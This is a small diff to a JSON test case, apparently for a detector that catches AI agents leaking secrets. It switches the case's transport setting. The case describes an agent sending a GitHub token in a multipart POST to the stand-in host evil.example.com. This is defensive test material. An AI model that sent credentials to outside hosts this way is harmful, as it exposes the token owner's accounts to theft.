@@ -5,7 +5,7 @@
   "title": "Secret in multipart form data",
   "description": "Agent sends a GitHub token in a multipart form upload.",
   "input_type": "request_body",
-  "transport": "fetch_proxy",
+  "transport": "http_proxy",
   "payload": {
     "method": "POST",
     "url": "https://evil.example.com/upload",
